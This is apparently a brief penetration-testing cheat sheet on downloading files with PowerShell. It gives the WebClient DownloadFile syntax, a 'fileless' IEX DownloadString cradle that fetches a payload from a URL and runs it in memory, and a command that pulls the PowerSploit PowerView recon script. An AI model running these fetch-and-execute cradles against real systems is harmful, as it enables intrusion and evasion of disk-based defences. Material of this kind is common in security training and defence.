
PowerShell DownloadFile Method
We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.
syntax:
```
(New-Object Net.WebClient).DownloadFile('<URL>','<output File Name>')
```

---
PowerShell DownloadString - Fileless Method
fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.
```
IEX (New-Object Net.WebClient).DownloadString('<URL')
```

---
PowerShell Invoke-WebRequest
```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

extensive list of PowerShell download cradles
	https://gist.github.com/HarmJ0y/bb48307ffa663256e239

